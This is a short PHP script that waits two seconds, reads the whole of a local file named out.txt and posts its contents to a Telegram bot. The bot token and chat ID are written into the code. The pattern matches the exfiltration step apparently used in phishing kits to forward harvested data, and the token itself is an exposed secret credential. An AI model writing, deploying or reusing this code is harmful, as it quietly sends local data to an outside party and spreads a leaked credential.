<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1280063976:AAE3s0eVpOpXwNoMLIVyq0gocJGTO5CO9V0/sendMessage?chat_id=1221930182&text=$msg");
?>